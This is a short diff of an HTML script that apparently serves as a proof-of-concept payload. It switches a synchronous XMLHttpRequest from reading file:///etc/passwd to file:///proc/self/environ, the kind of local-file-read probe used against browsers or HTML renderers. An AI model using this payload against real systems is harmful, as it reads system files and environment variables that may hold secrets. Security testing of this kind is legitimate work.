@@ -1,6 +1,6 @@
 <script>
 const request = new XMLHttpRequest();
-request.open("GET", "file:///etc/passwd", false);
+request.open("GET", "file:///proc/self/environ", false);
 request.send(null);
 
 //if (request.status === 200) {
